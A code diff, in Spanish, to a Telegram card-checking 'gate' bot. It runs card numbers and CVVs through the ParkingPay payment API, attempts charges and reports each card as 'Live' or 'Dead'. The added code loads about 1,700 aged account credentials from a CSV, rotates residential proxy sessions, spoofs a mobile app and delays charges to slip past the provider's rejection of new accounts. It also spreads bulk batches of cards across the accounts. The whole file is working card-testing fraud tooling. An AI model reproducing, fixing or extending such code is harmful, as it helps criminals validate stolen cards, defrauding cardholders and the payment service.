@@ -2,14 +2,16 @@
 from __future__ import annotations
 
 import asyncio
+import csv
 import json
 import logging
+import os
 import random
+import threading
 import string
 import time
 from collections import defaultdict
 from datetime import datetime
-from pathlib import Path
 from typing import Callable, Dict, List, Optional, Tuple
 
 import cloudscraper
@@ -42,6 +44,61 @@ def _pick_proxy(pool: str = "mx") -> Optional[dict]:
     return {"http": proxy_url, "https": proxy_url}
 
 
+# Lifetime de la sesión sticky para un lote masivo: debe aguantar el lote
+# entero (10 tarjetas x ~30s ≈ 5+ min). Sesiones cortas expiran a mitad del
+# lote y las tarjetas finales caen por conexión.
+_MASS_STICKY_LIFETIME = "10m"
+
+
+def _pick_fresh_proxy(pool: str = "mx") -> Optional[dict]:
+    """Proxy sticky NUEVO (sesión distinta a la URL estática del .env).
+
+    Los masivos no deben reusar la URL estática ``IPROYAL_STICKY_MX_URL``:
+    todo el tráfico de los 4 gates saldría por la misma IP y un lote largo
+    satura el mismo túnel.
+
+    IMPORTANTE: la sesión nueva se clona de la propia URL estática (mismo
+    usuario, misma base de password, mismo host/puerto), cambiando solo el
+    ``_session-`` y el ``_lifetime-``. Armar la cadena desde
+    ``IPROYAL_USERNAME``/``IPROYAL_PASSWORD_BASE`` NO sirve: esas credenciales
+    no tienen la función necesaria y el proxy responde
+    ``403 Feature not enabled: streaming``.
+    """
+    import re
+    import urllib.parse
+
+    static_url = gate_proxy(pool)
+    if static_url:
+        try:
+            parts = urllib.parse.urlparse(static_url)
+            pwd = urllib.parse.unquote(parts.password or "")
+            session = "".join(
+                random.choices(string.ascii_letters + string.digits, k=8)
+            )
+            if "_session-" in pwd:
+                pwd = re.sub(r"_session-[A-Za-z0-9]+", f"_session-{session}", pwd)
+            else:
+                pwd = f"{pwd}_session-{session}"
+            if "_lifetime-" in pwd:
+                pwd = re.sub(r"_lifetime-[0-9]+[smhd]", f"_lifetime-{_MASS_STICKY_LIFETIME}", pwd)
+            else:
+                pwd = f"{pwd}_lifetime-{_MASS_STICKY_LIFETIME}"
+            fresh = urllib.parse.urlunparse((
+                parts.scheme,
+                f"{parts.username}:{urllib.parse.quote(pwd, safe='')}@{parts.hostname}"
+                + (f":{parts.port}" if parts.port else ""),
+                parts.path or "",
+                parts.params or "",
+                parts.query or "",
+                parts.fragment or "",
+            ))
+            return {"http": fresh, "https": fresh}
+        except Exception as exc:
+            logger.debug("No se pudo clonar proxy sticky: %s", exc)
+            return {"http": static_url, "https": static_url}
+    return _pick_proxy(pool)
+
+
 # ---------------------------------------------------------------------------
 # Configuración de la API objetivo
 # ---------------------------------------------------------------------------
@@ -51,6 +108,29 @@ LOGIN_URL = f"{API_BASE}/api/auth"
 TARJETAS_URL = f"{API_BASE}/api/app/conductor/tarjetas"
 CONDUCTOR_URL = f"{API_BASE}/api/app/conductor"
 ABONO_URL = f"{API_BASE}/api/app/conductor/pagos/abono"
+
+# La API parece rechazar abonos sobre cuentas/tarjetas recién dadas de
+# alta (502 "No se pudo generar el abono con el proveedor") si el cargo
+# se dispara demasiado pronto. La app manual pasa con ~40s de gap entre
+# el alta y el abono; las rondas del bot lo hacían a los ~13s. Esperar
+# a que la tarjeta "madure" dentro de la cuenta antes del cobro.
+# Ajustable con PARKINGPAY_ABONO_DELAY (segundos desde el ALTA).
+ABONO_DELAY = float(os.getenv("PARKINGPAY_ABONO_DELAY", "40"))
+
+# Pool de cuentas envejecidas: desde ~2026-09-20 ParkingPay rechaza el
+# abono (502 del proveedor) contra cuentas recién registradas, aunque no
+# las recién-altas en sí. Giro verificado 2026-11-05: la misma tarjeta
+# 502-ó tres veces en cuentas frescas y abonó OK al primer intento en
+# una cuenta vieja re-logineada. El CSV (copia del pool del bot viejo)
+# trae email/password de ~1700 cuentas ya maduras; se reloguea por ronda
+# porque los JWT de archivo caducan (403).
+_AGED_ACCOUNTS_PATH = os.path.join(
+    os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
+    "data", "parkingpay_cuentas.csv",
+)
+# Tarjetas por cuenta dentro de un lote masivo (alineado al límite de
+# 10 tarjetas por edición de Telegram en /mass).
+_CARDS_PER_ACCOUNT = 10
 
 MONTOS = {
     "Euridice": 100.0,
@@ -149,19 +229,9 @@ def _mensaje_apagado(gate_name: str) -> Dict[str, str]:
     }
 
 
-# ---------------------------------------------------------------------------
-# Fallback: token estático desde archivo
-# ---------------------------------------------------------------------------
-def _leer_token_estatico() -> Optional[str]:
-    try:
-        archivo = Path("data/txt/token1.txt")
-        if not archivo.exists():
-            return None
-        lineas = [linea.strip() for linea in archivo.read_text(encoding="utf-8").splitlines() if linea.strip()]
-        return random.choice(lineas) if lineas else None
-    except Exception as exc:
-        logger.debug("Error leyendo token estático: %s", exc)
-        return None
+def _obtener_token(proxies: Optional[dict] = None) -> Optional[str]:
+    """Registra una cuenta nueva y devuelve su token JWT (o None si falla)."""
+    return _register_account(proxies=proxies)
 
 
 # ---------------------------------------------------------------------------
@@ -209,7 +279,7 @@ def _register_account(proxies: Optional[dict] = None) -> Optional[str]:
         if _es_pagina_apagada(r.status_code, r.text):
             raise _ApiApagada()
         if r.status_code not in (200, 201):
-            logger.debug("Registro falló: HTTP %s - %s", r.status_code, r.text[:120])
+            logger.warning("ParkingPay registro falló: HTTP %s - %s", r.status_code, r.text[:120])
             return None
 
         login_data = {"CorreoElectronico": email, "Contrasena": password}
@@ -219,10 +289,10 @@ def _register_account(proxies: Optional[dict] = None) -> Optional[str]:
             token = data.get("token")
             if token:
                 return token
-        logger.debug("Login falló: HTTP %s - %s", r2.status_code, r2.text[:120])
+        logger.warning("ParkingPay login falló: HTTP %s - %s", r2.status_code, r2.text[:120])
         return None
     except Exception as exc:
-        logger.debug("Error en registro dinámico: %s", exc)
+        logger.warning("Error en registro dinámico ParkingPay: %s", exc)
         return None
     finally:
         try:
@@ -232,11 +302,105 @@ def _register_account(proxies: Optional[dict] = None) -> Optional[str]:
 
 
 def _obtener_token(proxies: Optional[dict] = None) -> Optional[str]:
-    """Intenta obtener token dinámico; si falla, usa el estático."""
-    token = _register_account(proxies=proxies)
-    if token:
-        return token
-    return _leer_token_estatico()
+    """Registra una cuenta nueva y devuelve su token JWT (o None si falla)."""
+    return _register_account(proxies=proxies)
+
+
+_AGED_STATE = threading.Lock()
+_aged_cache: Optional[List[Tuple[str, str]]] = None
+_aged_pointer = 0
+
+
+def _load_aged_accounts() -> List[Tuple[str, str]]:
+    global _aged_cache
+    if _aged_cache is None:
+        rows: List[Tuple[str, str]] = []
+        try:
+            with open(_AGED_ACCOUNTS_PATH, newline="", encoding="utf-8") as fh:
+                for row in csv.DictReader(fh):
+                    email = (row.get("email") or "").strip()
+                    password = (row.get("password") or "").strip()
+                    if email and password:
+                        rows.append((email, password))
+        except FileNotFoundError:
+            logger.warning("ParkingPay pool de cuentas envejecidas no encontrado: %s", _AGED_ACCOUNTS_PATH)
+        except OSError as exc:
+            logger.warning("ParkingPay no se pudo leer el pool de cuentas: %s", exc)
+        _aged_cache = rows
+        if rows:
+            logger.info("ParkingPay pool de cuentas envejecidas cargado: %s cuentas", len(rows))
+    return _aged_cache
+
+
+def _obtener_token_aged(
+    proxies: Optional[dict] = None,
+    pedir: int = 1,
+) -> List[str]:
+    """Loginea cuentas envejecidas del pool y devuelve JWTs vivos.
+
+    Devuelve hasta `pedir` tokens de cuentas DISTINTAS en rotación
+    secuencial sobre el CSV. Si el login falla en una cuenta, se salta a
+    la siguiente. Sin pool, o si nada loginea, devuelve lista vacía y el
+    caller decide el fallback (registro dinámico).
+    """
+    global _aged_pointer
+    with _AGED_STATE:
+        rows = _load_aged_accounts()
+        total = len(rows)
+        if total == 0:
+            return []
+        start = _aged_pointer
+
+    tokens: List[str] = []
+    scraper: Optional[cloudscraper.CloudScraper] = None
+    try:
+        usadas = 0
+        for k in range(total):
+            if len(tokens) >= max(1, pedir):
+                break
+            email, password = rows[(start + k) % total]
+            usadas += 1
+            if scraper is None:
+                scraper = cloudscraper.create_scraper(
+                    browser={"browser": "chrome", "platform": "ios", "mobile": True},
+                    delay=2,
+                )
+                if proxies:
+                    scraper.proxies = proxies
+            try:
+                r = scraper.post(
+                    LOGIN_URL,
+                    json={"CorreoElectronico": email, "Contrasena": password},
+                    headers={
+                        "user-agent": "Dart/2.18 (dart:io)",
+                        "content-type": "application/json; charset=utf-8",
+                    },
+                    timeout=20,
+                )
+                if _es_pagina_apagada(r.status_code, r.text):
+                    raise _ApiApagada()
+                if r.status_code in (200, 201):
+                    token = r.json().get("token")
+                    if token:
+                        tokens.append(token)
+            except _ApiApagada:
+                raise
+            except Exception as exc:
+                logger.debug("ParkingPay login envejecido falló (%s): %s", email, exc)
+        with _AGED_STATE:
+            _aged_pointer = (start + (usadas or 1)) % total
+        if tokens:
+            logger.info(
+                "ParkingPay tokens envejecidos: %s/%s vivos (rotación desde cuenta #%s)",
+                len(tokens), pedir, start,
+            )
+        return tokens
+    finally:
+        if scraper is not None:
+            try:
+                scraper.close()
+            except Exception:
+                pass
 
 
 # ---------------------------------------------------------------------------
@@ -292,6 +456,7 @@ async def _make_gate_request_inner(
     card_data: str,
     user_id: int,
     shared_proxies: Optional[dict] = None,
+    shared_token: Optional[str] = None,
 ) -> Dict[str, str]:
     global _active_requests_count
     _active_requests_count += 1
@@ -303,16 +468,32 @@ async def _make_gate_request_inner(
             return {"status": "❌ Dead", "message": "Fechas Invalidas"}
 
         cc_number, mes, ano, cvv = resultado
+        # La app manda el mes siempre a 2 dígitos ("06", no "6").
+        # Si el usuario manda un solo dígito, normalizar aquí: el API
+        # rechaza o evalúa distinto el formato corto.
+        try:
+            mes = f"{int(mes):02d}"
+        except ValueError:
+            return {"status": "❌ Dead", "message": "Fechas Invalidas"}
 
         # Si no nos pasaron proxy, elegimos uno del pool correspondiente a este gate.
         proxies = shared_proxies or _pick_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))
 
-        try:
-            token = await asyncio.to_thread(_obtener_token, proxies)
-        except _ApiApagada:
-            return _mensaje_apagado(gate_name)
+        if shared_token:
+            token = shared_token
+        else:
+            try:
+                aged = await asyncio.to_thread(_obtener_token_aged, proxies, 1)
+                token = aged[0] if aged else None
+            except _ApiApagada:
+                return _mensaje_apagado(gate_name)
+            if not token:
+                try:
+                    token = await asyncio.to_thread(_obtener_token, proxies)
+                except _ApiApagada:
+                    return _mensaje_apagado(gate_name)
         if not token:
-            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "No hay tokens disponibles"}
+            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error creando la cuenta del gate, intenta de nuevo"}
 
         scraper = cloudscraper.create_scraper(
             browser={"browser": "chrome", "platform": "ios", "mobile": True},
@@ -339,6 +520,8 @@ async def _make_gate_request_inner(
             timeout=20,
         )
 
+        alta_ts = datetime.now()
+
         await asyncio.sleep(5)
 
         if "This web app is stopped" in response.text or response.status_code == 403:
@@ -346,12 +529,14 @@ async def _make_gate_request_inner(
 
         if response.status_code == 400 or "Ocurrió un error al crear la tarjeta en stripe" in response.text:
             tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
+            logger.warning("ParkingPay ALTA declinada %s: HTTP %s %s", gate_name, response.status_code, (response.text or "")[:200])
             return {"status": "❌ Dead", "message": f"Dead - {tiempo} segundos"}
 
         try:
             stripe_card_id = json.loads(response.text)["stripeCardId"]
         except (KeyError, json.JSONDecodeError):
             tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
+            logger.warning("ParkingPay ALTA sin stripeCardId %s: HTTP %s %s", gate_name, response.status_code, (response.text or "")[:200])
             return {"status": "❌ Dead", "message": f"No se pudo obtener stripeCardId - {tiempo} segundos"}
 
         await asyncio.sleep(3)
@@ -389,6 +574,16 @@ async def _make_gate_request_inner(
             tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
             return {"status": "✅ Live", "message": f"Charger {monto} Mnx - {tiempo} segundos"}
 
+        # Espera de maduración: ParkingPay rechaza el abono (502 del
+        # proveedor) si el cobro llega demasiado pronto tras el alta.
+        # Segundos ya consumidos desde el ALTA corren a favor (sleeps
+        # fijos + latencia), solo se congela el faltante.
+        madurez = (datetime.now() - alta_ts).total_seconds()
+        falta = ABONO_DELAY - madurez
+        if falta > 0:
+            logger.info("ParkingPay esperando madurez %s: %.1fs restantes", gate_name, falta)
+            await asyncio.sleep(falta)
+
         # Paso 3: Realizar cargo
         response = await asyncio.to_thread(
             scraper.post,
@@ -399,16 +594,26 @@ async def _make_gate_request_inner(
         )
 
         tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
-
-        if "stripeCardId" in response.text or response.status_code == 200:
+        cuerpo = response.text or ""
+        if "stripeCardId" in cuerpo or response.status_code == 200:
+            logger.info("ParkingPay abono OK %s: HTTP %s %s", gate_name, response.status_code, cuerpo[:200])
             return {"status": "✅ Live", "message": f"Charger {monto} Mnx - {tiempo} segundos"}
 
-        return {"status": "❌ Dead", "message": "Tarjeta delinada"}
+        # Veredicto por señal, no por descarte: solo es Dead si el backend
+        # dice que el cargo no pasó. Una respuesta inesperada (500, HTML,
+        # validación) es error de herramienta, no tarjeta muerta: antes
+        # caía a Dead genérico y quemaba lives como declinadas.
+        bajo = cuerpo.lower()
+        if any(k in bajo for k in ("no se pudo generar", "declin", "insuficiente", "fondos", "rechaz", "do not honor", "do_not_honor")):
+            logger.warning("ParkingPay abono declinado %s: HTTP %s %s", gate_name, response.status_code, cuerpo[:200])
+            return {"status": "❌ Dead", "message": f"Tarjeta declinada - {tiempo} segundos"}
+        logger.warning("ParkingPay abono sin veredicto %s: HTTP %s %s", gate_name, response.status_code, cuerpo[:200])
+        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error avisar a un administrador"}
 
     except _ApiApagada:
         return _mensaje_apagado(gate_name)
     except requests.exceptions.RequestException as exc:
-        logger.debug("Error de red en gate %s: %s", gate_name, exc)
+        logger.warning("Error de red en gate %s (user=%s): %s", gate_name, user_id, exc)
         return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error de conexión con el gate"}
     except Exception as exc:
         logger.exception("Error REAL en gate %s (oculto al usuario): %s", gate_name, exc)
@@ -437,6 +642,7 @@ async def _make_gate_request(
     card_data: str,
     user_id: int,
     shared_proxies: Optional[dict] = None,
+    shared_token: Optional[str] = None,
 ) -> Dict[str, str]:
     """Envuelve el flujo del gate aplicando la regla nocturna.
 
@@ -444,7 +650,7 @@ async def _make_gate_request(
     el gate está encendido. Pero un error después de las 8:20pm
     (hora México) es casi seguro gate apagado y se reporta como tal.
     """
-    result = await _make_gate_request_inner(gate_name, card_data, user_id, shared_proxies)
+    result = await _make_gate_request_inner(gate_name, card_data, user_id, shared_proxies, shared_token)
     if result.get("status") == "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error" and _es_noche_apagado():
         return _mensaje_apagado(gate_name)
     return result
@@ -479,21 +685,87 @@ async def gate_check_multiple(
     if total == 0:
         return []
 
-    # Un solo proxy para TODO el lote masivo. Así no se queman 10 proxies por usuario.
-    shared_proxies = _pick_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))
+    # Proxy NUEVO por lote (sesión distinta a la URL estática del .env) con
+    # lifetime suficiente para el lote entero (~10m para 10 x ~30s).
+    shared_proxies = _pick_fresh_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))
+
+    # Un token (cuenta) por bloque de tarjetas: igual evitamos registrar
+    # N cuentas desde la misma IP y recortar el tiempo del lote. Con el
+    # pool envejecido se reparten entre cuentas maduras con techo de 15
+    # tarjetas por cuenta; si el pool no rinde, cae al registro dinámico
+    # (1 token para todo el lote) y en última instancia a token por
+    # tarjeta como antes.
+    n_cuentas = max(1, (total + _CARDS_PER_ACCOUNT - 1) // _CARDS_PER_ACCOUNT)
+    shared_tokens: List[str] = []
+    try:
+        shared_tokens = await asyncio.to_thread(_obtener_token_aged, shared_proxies, n_cuentas)
+    except _ApiApagada:
+        apagado = _mensaje_apagado(gate_name)
+        results_apagado = [dict(apagado) for _ in cards_clean]
+        if callback:
+            for i, card in enumerate(cards_clean):
+                try:
+                    await callback(i, dict(apagado), card, uid)
+                except Exception as cb_err:
+                    logger.debug("Error en callback tarjeta %s: %s", i + 1, cb_err)
+        return results_apagado
+    if shared_tokens:
+        logger.info(
+            "Mass %s: %s cuentas envejecidas para %s tarjetas (%s/cuenta)",
+            gate_name, len(shared_tokens), total, _CARDS_PER_ACCOUNT,
+        )
+    else:
+        shared_tokens = []
+    if not shared_tokens:
+        try:
+            fallback_token = await asyncio.to_thread(_obtener_token, shared_proxies)
+        except _ApiApagada:
+            apagado = _mensaje_apagado(gate_name)
+            results_apagado = [dict(apagado) for _ in cards_clean]
+            if callback:
+                for i, card in enumerate(cards_clean):
+                    try:
+                        await callback(i, dict(apagado), card, uid)
+                    except Exception as cb_err:
+                        logger.debug("Error en callback tarjeta %s: %s", i + 1, cb_err)
+            return results_apagado
+        if fallback_token:
+            shared_tokens = [fallback_token]
+        else:
+            logger.warning("Mass %s: sin token compartido, cada tarjeta usará el suyo", gate_name)
 
     results: List[Optional[Dict[str, str]]] = [None] * total
     result_queue: asyncio.Queue[Tuple[int, Dict[str, str]]] = asyncio.Queue()
 
+    _CONN_ERROR = "Error de conexión con el gate"
+
     async def process_single_card(index: int, card_data: str) -> Dict[str, str]:
         max_retries = 3
         retry = 0
+        proxies = shared_proxies
+        token = None
+        if shared_tokens:
+            chunk = (index // _CARDS_PER_ACCOUNT) % len(shared_tokens)
+            token = shared_tokens[chunk]
         while retry < max_retries:
             try:
                 async with _global_semaphore:
                     async with _user_semaphores[uid]:
                         await asyncio.sleep(0.1 + (index % 5) * 0.05)
-                        result = await _make_gate_request(gate_name, card_data, uid, shared_proxies)
+                        result = await _make_gate_request(gate_name, card_data, uid, proxies, token)
+                        # El dict de error de conexión ya venía capturado adentro y
+                        # por eso nunca reintentaba: aquí sí se reintenta, con
+                        # proxy y token frescos, antes de darlo por perdido.
+                        if result.get("message") == _CONN_ERROR and retry + 1 < max_retries:
+                            retry += 1
+                            logger.warning(
+                                "Mass %s tarjeta %s: error de conexión, reintento %s/%s con proxy nuevo",
+                                gate_name, index + 1, retry + 1, max_retries,
+                            )
+                            await asyncio.sleep(3)
+                            proxies = _pick_fresh_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))
+                            token = None
+                            continue
                         await result_queue.put((index, result))
                         return result
             except Exception as exc:
